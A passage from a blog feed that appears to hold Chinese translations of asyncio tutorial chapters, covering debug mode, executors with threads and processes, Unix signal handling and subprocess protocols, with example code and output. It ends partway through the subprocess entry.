      <link href="/2017/12/21/asyncio%E4%B9%8B%E8%B0%83%E8%AF%95asyncio/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E8%B0%83%E8%AF%95asyncio/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>调试asyncio</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>asyncio中内置了几个有用的调试功能。<br>首先，事件循环在运行时使用日志来发送状态消息。如果在应用程序中启用日志记录，则其中的一些功能可用。其他的可以通过告诉循环发出更多的调试消息来打开。调用set_debug()传递布尔值，指示是否应该启用调试。<br>因为构建在asyncio上的应用程序对贪婪的协程不交出控制权高度敏感，因此有支持检测事件循环内置的慢回调。通过启用调试来打开它，并通过将循环的slow_callback_duration属性设置为发出警告的秒数来控制定义的“slow”。<br>最后，如果使用asyncio的应用程序退出而没有清除一些协程或其他资源，这可能意味着有一个逻辑错误阻止了一些应用程序代码的运行。启用ResourceWarning警告会导致在程序退出时报告这些情况。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> argparse</div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> warnings</div><div class="line"></div><div class="line">parser = argparse.ArgumentParser(<span class="string">'debugging asyncio'</span>)</div><div class="line">parser.add_argument(</div><div class="line">    <span class="string">'-v'</span>,</div><div class="line">    dest=<span class="string">'verbose'</span>,</div><div class="line">    default=<span class="keyword">False</span>,</div><div class="line">    action=<span class="string">'store_true'</span>,</div><div class="line">)</div><div class="line">args = parser.parse_args()</div><div class="line"></div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(levelname)7s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">LOG = logging.getLogger(<span class="string">''</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></div><div class="line">    LOG.info(<span class="string">'inner starting'</span>)</div><div class="line">    <span class="comment"># Use a blocking sleep to simulate</span></div><div class="line">    <span class="comment"># doing work inside the function.</span></div><div class="line">    time.sleep(<span class="number">0.1</span>)</div><div class="line">    LOG.info(<span class="string">'inner completed'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">outer</span><span class="params">(loop)</span>:</span></div><div class="line">    LOG.info(<span class="string">'outer starting'</span>)</div><div class="line">    <span class="keyword">await</span> asyncio.ensure_future(loop.create_task(inner()))</div><div class="line">    LOG.info(<span class="string">'outer completed'</span>)</div><div class="line"></div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">if</span> args.verbose:</div><div class="line">    LOG.info(<span class="string">'enabling debugging'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># Enable debugging</span></div><div class="line">    event_loop.set_debug(<span class="keyword">True</span>)</div><div class="line"></div><div class="line">    <span class="comment"># Make the threshold for "slow" tasks very very small for</span></div><div class="line">    <span class="comment"># illustration. The default is 0.1, or 100 milliseconds.</span></div><div class="line">    event_loop.slow_callback_duration = <span class="number">0.001</span></div><div class="line"></div><div class="line">    <span class="comment"># Report all mistakes managing asynchronous resources.</span></div><div class="line">    warnings.simplefilter(<span class="string">'always'</span>, ResourceWarning)</div><div class="line"></div><div class="line">LOG.info(<span class="string">'entering event loop'</span>)</div><div class="line">event_loop.run_until_complete(outer(event_loop))</div></pre></td></tr></table></figure></p><p>在未启用调试的情况下运行时，此应用程序一切正常。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_debug.py</div><div class="line"></div><div class="line">  DEBUG: Using selector: KqueueSelector</div><div class="line">  INFO: entering event loop</div><div class="line">  INFO: outer starting</div><div class="line">  INFO: inner starting</div><div class="line">  INFO: inner completed</div><div class="line">  INFO: outer completed</div></pre></td></tr></table></figure></p><p>开启调试暴露了它的一些问题，事实上虽然inner()已经完成，但是这比设置的slow_callback_duration需要更多的时间，并且程序退出时事件循环未被正确关闭。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_debug.py -v</div><div class="line"></div><div class="line">  DEBUG: Using selector: KqueueSelector</div><div class="line">  INFO: enabling debugging</div><div class="line">  INFO: entering event loop</div><div class="line">  INFO: outer starting</div><div class="line">  INFO: inner starting</div><div class="line">  INFO: inner completed</div><div class="line">WARNING: Executing &lt;Task finished coro=&lt;inner() done, defined at</div><div class="line">asyncio_debug.py:<span class="number">34</span>&gt; result=<span class="keyword">None</span> created at asyncio_debug.py:<span class="number">44</span>&gt;</div><div class="line">took <span class="number">0.102</span> seconds</div><div class="line">  INFO: outer completed</div><div class="line">.../lib/python3<span class="number">.5</span>/asyncio/base_events.py:<span class="number">429</span>: ResourceWarning:</div><div class="line">unclosed event loop &lt;_UnixSelectorEventLoop running=<span class="keyword">False</span></div><div class="line">closed=<span class="keyword">False</span> debug=<span class="keyword">True</span>&gt;</div><div class="line">  DEBUG: Close &lt;_UnixSelectorEventLoop running=<span class="keyword">False</span></div><div class="line">closed=<span class="keyword">False</span> debug=<span class="keyword">True</span>&gt;</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之协程结合线程和进程</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%8D%8F%E7%A8%8B%E7%BB%93%E5%90%88%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%8D%8F%E7%A8%8B%E7%BB%93%E5%90%88%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>协程结合线程和进程</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>很多现有的库都没有准备好与asyncio一起使用。它们可能会阻塞，或者依赖于模块不可用的并发功能。但仍然可以使用这些库，在一个基于asyncio的应用程序中，通过使用concurrent.futures的executor ，可以在单独的线程或单独的进程中运行代码。</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>事件循环的run_in_executor()方法需要executor 实例，可调用的常规调用以及要传递给可调用对象的任何参数。它返回一个Future，可以用来等待函数完成它的工作并返回一些东西。如果没有executor被传入，则创建一个ThreadPoolExecutor。这个例子明确地创建了一个执行器来限制它可用的工作线程的数量。<br>一个ThreadPoolExecutor启动它的工作线程，然后在一个线程中调用每个提供的函数。这个例子展示了如何结合run_in_executor()和wait()让协程让出控制权给事件循环，当阻塞函数在单独的线程中运行时，然后在这些函数完成时唤醒。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> concurrent.futures</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blocks</span><span class="params">(n)</span>:</span></div><div class="line">    log = logging.getLogger(<span class="string">'blocks(&#123;&#125;)'</span>.format(n))</div><div class="line">    log.info(<span class="string">'running'</span>)</div><div class="line">    time.sleep(<span class="number">0.1</span>)</div><div class="line">    log.info(<span class="string">'done'</span>)</div><div class="line">    <span class="keyword">return</span> n ** <span class="number">2</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run_blocking_tasks</span><span class="params">(executor)</span>:</span></div><div class="line">    log = logging.getLogger(<span class="string">'run_blocking_tasks'</span>)</div><div class="line">    log.info(<span class="string">'starting'</span>)</div><div class="line"></div><div class="line">    log.info(<span class="string">'creating executor tasks'</span>)</div><div class="line">    loop = asyncio.get_event_loop()</div><div class="line">    blocking_tasks = [</div><div class="line">        loop.run_in_executor(executor, blocks, i)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>)</div><div class="line">    ]</div><div class="line">    log.info(<span class="string">'waiting for executor tasks'</span>)</div><div class="line">    completed, pending = <span class="keyword">await</span> asyncio.wait(blocking_tasks)</div><div class="line">    results = [t.result() <span class="keyword">for</span> t <span class="keyword">in</span> completed]</div><div class="line">    log.info(<span class="string">'results: &#123;!r&#125;'</span>.format(results))</div><div class="line"></div><div class="line">    log.info(<span class="string">'exiting'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment"># Configure logging to show the name of the thread</span></div><div class="line">    <span class="comment"># where the log message originates.</span></div><div class="line">    logging.basicConfig(</div><div class="line">        level=logging.INFO,</div><div class="line">        format=<span class="string">'%(threadName)10s %(name)18s: %(message)s'</span>,</div><div class="line">        stream=sys.stderr,</div><div class="line">    )</div><div class="line"></div><div class="line">    <span class="comment"># Create a limited thread pool.</span></div><div class="line">    executor = concurrent.futures.ThreadPoolExecutor(</div><div class="line">        max_workers=<span class="number">3</span>,</div><div class="line">    )</div><div class="line"></div><div class="line">    event_loop = asyncio.get_event_loop()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        event_loop.run_until_complete(</div><div class="line">            run_blocking_tasks(executor)</div><div class="line">        )</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        event_loop.close()</div></pre></td></tr></table></figure></p><p>asyncio_executor_thread.py使用日志记录来方便地指示哪个线程和函数正在生成每个日志消息。因为每次调用block()都会使用一个单独的记录器，所以输出清楚地显示了相同的线程被重用，以不同的参数调用函数的多个副本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_executor_thread.py</div><div class="line"></div><div class="line">MainThread run_blocking_tasks: starting</div><div class="line">MainThread run_blocking_tasks: creating executor tasks</div><div class="line">  Thread<span class="number">-1</span>          blocks(<span class="number">0</span>): running</div><div class="line">  Thread<span class="number">-2</span>          blocks(<span class="number">1</span>): running</div><div class="line">  Thread<span class="number">-3</span>          blocks(<span class="number">2</span>): running</div><div class="line">MainThread run_blocking_tasks: waiting <span class="keyword">for</span> executor tasks</div><div class="line">  Thread<span class="number">-1</span>          blocks(<span class="number">0</span>): done</div><div class="line">  Thread<span class="number">-3</span>          blocks(<span class="number">2</span>): done</div><div class="line">  Thread<span class="number">-1</span>          blocks(<span class="number">3</span>): running</div><div class="line">  Thread<span class="number">-2</span>          blocks(<span class="number">1</span>): done</div><div class="line">  Thread<span class="number">-3</span>          blocks(<span class="number">4</span>): running</div><div class="line">  Thread<span class="number">-2</span>          blocks(<span class="number">5</span>): running</div><div class="line">  Thread<span class="number">-1</span>          blocks(<span class="number">3</span>): done</div><div class="line">  Thread<span class="number">-2</span>          blocks(<span class="number">5</span>): done</div><div class="line">  Thread<span class="number">-3</span>          blocks(<span class="number">4</span>): done</div><div class="line">MainThread run_blocking_tasks: results: [<span class="number">16</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">9</span>]</div><div class="line">MainThread run_blocking_tasks: exiting</div></pre></td></tr></table></figure></p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>ProcessPoolExecutor的工作方式大致相同，创建一组工作进程而不是线程。使用单独的进程需要更多的系统资源，但是对于计算密集型操作，可以在每个CPU内核上运行单独的任务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment"># Configure logging to show the id of the process</span></div><div class="line">    <span class="comment"># where the log message originates.</span></div><div class="line">    logging.basicConfig(</div><div class="line">        level=logging.INFO,</div><div class="line">        format=<span class="string">'PID %(process)5s %(name)18s: %(message)s'</span>,</div><div class="line">        stream=sys.stderr,</div><div class="line">    )</div><div class="line"></div><div class="line">    <span class="comment"># Create a limited process pool.</span></div><div class="line">    executor = concurrent.futures.ProcessPoolExecutor(</div><div class="line">        max_workers=<span class="number">3</span>,</div><div class="line">    )</div><div class="line"></div><div class="line">    event_loop = asyncio.get_event_loop()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        event_loop.run_until_complete(</div><div class="line">            run_blocking_tasks(executor)</div><div class="line">        )</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        event_loop.close()</div></pre></td></tr></table></figure></p><p>从线程转移到进程所需的唯一更改是创建不同类型的executor。此示例还将日志记录格式字符串更改为包含进程标识而不是线程名称，以演示实际上这些任务正在单独的进程中运行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_executor_process.py</div><div class="line"></div><div class="line">PID <span class="number">16429</span> run_blocking_tasks: starting</div><div class="line">PID <span class="number">16429</span> run_blocking_tasks: creating executor tasks</div><div class="line">PID <span class="number">16429</span> run_blocking_tasks: waiting <span class="keyword">for</span> executor tasks</div><div class="line">PID <span class="number">16430</span>          blocks(<span class="number">0</span>): running</div><div class="line">PID <span class="number">16431</span>          blocks(<span class="number">1</span>): running</div><div class="line">PID <span class="number">16432</span>          blocks(<span class="number">2</span>): running</div><div class="line">PID <span class="number">16430</span>          blocks(<span class="number">0</span>): done</div><div class="line">PID <span class="number">16432</span>          blocks(<span class="number">2</span>): done</div><div class="line">PID <span class="number">16431</span>          blocks(<span class="number">1</span>): done</div><div class="line">PID <span class="number">16430</span>          blocks(<span class="number">3</span>): running</div><div class="line">PID <span class="number">16432</span>          blocks(<span class="number">4</span>): running</div><div class="line">PID <span class="number">16431</span>          blocks(<span class="number">5</span>): running</div><div class="line">PID <span class="number">16431</span>          blocks(<span class="number">5</span>): done</div><div class="line">PID <span class="number">16432</span>          blocks(<span class="number">4</span>): done</div><div class="line">PID <span class="number">16430</span>          blocks(<span class="number">3</span>): done</div><div class="line">PID <span class="number">16429</span> run_blocking_tasks: results: [<span class="number">4</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">25</span>]</div><div class="line">PID <span class="number">16429</span> run_blocking_tasks: exiting</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之接收Unix信号</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E6%8E%A5%E6%94%B6Unix%E4%BF%A1%E5%8F%B7/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E6%8E%A5%E6%94%B6Unix%E4%BF%A1%E5%8F%B7/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>接收Unix信号</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>Unix系统事件通知通常会中断应用程序，触发其处理程序。当与asyncio一起使用时，信号处理程序回调会与事件循环管理的其他协程和回调交错。这导致中断的功能更少，因此需要提供安全防护来清理不完整的操作。信号处理程序必须是常规可回调函数，而不是协程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> signal</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_handler</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">'signal_handler(&#123;!r&#125;)'</span>.format(name))</div></pre></td></tr></table></figure></p><p>信号处理程序使用add_signal_handler()注册。第一个参数是信号，第二个是回调函数。回调函数没有参数，因此如果需要参数，函数可以用functools.partial()来包装。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"></div><div class="line">event_loop.add_signal_handler(</div><div class="line">    signal.SIGHUP,</div><div class="line">    functools.partial(signal_handler, name=<span class="string">'SIGHUP'</span>),</div><div class="line">)</div><div class="line">event_loop.add_signal_handler(</div><div class="line">    signal.SIGUSR1,</div><div class="line">    functools.partial(signal_handler, name=<span class="string">'SIGUSR1'</span>),</div><div class="line">)</div><div class="line">event_loop.add_signal_handler(</div><div class="line">    signal.SIGINT,</div><div class="line">    functools.partial(signal_handler, name=<span class="string">'SIGINT'</span>),</div><div class="line">)</div></pre></td></tr></table></figure></p><p>本示例程序使用协程通过os.kill()向自己发送信号。在发送每个信号之后，协程会让出控制权以允许处理程序运行。在一个正常的应用程序中，应用程序代码将控制权交给事件循环的地方会更多，并且不需要像这样的人工交出控制权。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_signals</span><span class="params">()</span>:</span></div><div class="line">    pid = os.getpid()</div><div class="line">    print(<span class="string">'starting send_signals for &#123;&#125;'</span>.format(pid))</div><div class="line"></div><div class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> [<span class="string">'SIGHUP'</span>, <span class="string">'SIGHUP'</span>, <span class="string">'SIGUSR1'</span>, <span class="string">'SIGINT'</span>]:</div><div class="line">        print(<span class="string">'sending &#123;&#125;'</span>.format(name))</div><div class="line">        os.kill(pid, getattr(signal, name))</div><div class="line">        <span class="comment"># Yield control to allow the signal handler to run,</span></div><div class="line">        <span class="comment"># since the signal does not interrupt the program</span></div><div class="line">        <span class="comment"># flow otherwise.</span></div><div class="line">        print(<span class="string">'yielding control'</span>)</div><div class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.01</span>)</div><div class="line">    <span class="keyword">return</span></div></pre></td></tr></table></figure></p><p>主程序运行send_signals()，直到它发送了所有的信号。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(send_signals())</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>输出显示send_signals()在发送信号后交出控制权时如何调用处理程序。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_signal.py</div><div class="line"></div><div class="line">starting send_signals <span class="keyword">for</span> <span class="number">21772</span></div><div class="line">sending SIGHUP</div><div class="line">yielding control</div><div class="line">signal_handler(<span class="string">'SIGHUP'</span>)</div><div class="line">sending SIGHUP</div><div class="line">yielding control</div><div class="line">signal_handler(<span class="string">'SIGHUP'</span>)</div><div class="line">sending SIGUSR1</div><div class="line">yielding control</div><div class="line">signal_handler(<span class="string">'SIGUSR1'</span>)</div><div class="line">sending SIGINT</div><div class="line">yielding control</div><div class="line">signal_handler(<span class="string">'SIGINT'</span>)</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之使用子进程</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%AD%90%E8%BF%9B%E7%A8%8B/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%AD%90%E8%BF%9B%E7%A8%8B/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>使用子进程</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>和其他程序或者进程一起工作的需求很常见，利用现有的代码而不用重写它，或者访问Python中没有的库或功能。与网络I/O一样，asyncio包含两个抽象，用于启动另一个程序，然后与之交互。</p><h3 id="使用协议抽象子进程"><a href="#使用协议抽象子进程" class="headerlink" title="使用协议抽象子进程"></a>使用协议抽象子进程</h3><p>这个例子使用一个协程启动一个进程来运行Unix命令df来查找本地磁盘上的可用空间。它使用subprocess_exec()启动进程，并将其绑定到一个协议类，该类知道如何读取df命令输出并解析它。协议类的方法根据子进程的I/O事件自动调用。由于stdin和stderr参数都设置为None，因此这些通信通道未连接到新进程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">run_df</span><span class="params">(loop)</span>:</span></div><div class="line">    print(<span class="string">'in run_df'</span>)</div><div class="line"></div><div class="line">    cmd_done = asyncio.Future(loop=loop)</div><div class="line">    factory = functools.partial(DFProtocol, cmd_done)</div><div class="line">    proc = loop.subprocess_exec(</div><div class="line">        factory,</div><div class="line">        <span class="string">'df'</span>, <span class="string">'-hl'</span>,</div><div class="line">        stdin=<span class="keyword">None</span>,</div><div class="line">        stderr=<span class="keyword">None</span>,</div><div class="line">    )</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        print(<span class="string">'launching process'</span>)</div><div class="line">        transport, protocol = <span class="keyword">await</span> proc</div><div class="line">        print(<span class="string">'waiting for process to complete'</span>)</div><div class="line">        <span class="keyword">await</span> cmd_done</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        transport.close()</div><div class="line"></div><div class="line">    <span class="keyword">return</span> cmd_done.result()</div></pre></td></tr></table></figure></p><p>DFProtocol类是SubprocessProtocol的子类，它定义了一个通过管道与另一个进程通信的API。done参数将成为调用者用来监视进程完成的Future。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DFProtocol</span><span class="params">(asyncio.SubprocessProtocol)</span>:</span></div><div class="line"></div><div class="line">    FD_NAMES = [<span class="string">'stdin'</span>, <span class="string">'stdout'</span>, <span class="string">'stderr'</span>]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, done_future)</span>:</span></div><div class="line">        self.done = done_future</div><div class="line">        self.buffer = bytearray()</div><div class="line">        super().__init__()</div></pre></td></tr></table></figure></p><p>与socket通信一样，当设置新进程的输入通道时，会调用connection_made()。transport参数是BaseSubprocessTransport子类的一个实例。如果进程配置为接收输入，它可以读取进程输出的数据并将数据写入进程的输入流。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">    print(<span class="string">'process started &#123;&#125;'</span>.format(transport.get_pid()))</div><div class="line">    self.transport = transport</div></pre></td></tr></table></figure></p><p>当进程产生输出时，pipe_data_received()被调用，其中文件描述符是来自数据发送的文件，实际的数据是从管道中读取的。协议类将进程的标准输出通道的输出保存在缓冲区中供以后处理。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pipe_data_received</span><span class="params">(self, fd, data)</span>:</span></div><div class="line">    print(<span class="string">'read &#123;&#125; bytes from &#123;&#125;'</span>.format(len(data), self.FD_NAMES[fd]))</div><div class="line">    <span class="keyword">if</span> fd == <span class="number">1</span>:</div><div class="line">        self.buffer.extend(data)</div></pre></td></tr></table></figure></p><p>当进程终止时，process_exited()被调用。通过调用get_returncode()可以从传输对象获得进程的退出代码。在这种情况下，如果没有错误报告，则在通过Future实例返回之前，可用的输出将被解码和解析。如果有错误，则结果被假设为空。设置将来的结果告诉run_df()该进程已经退出，所以它将清理并返回结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div 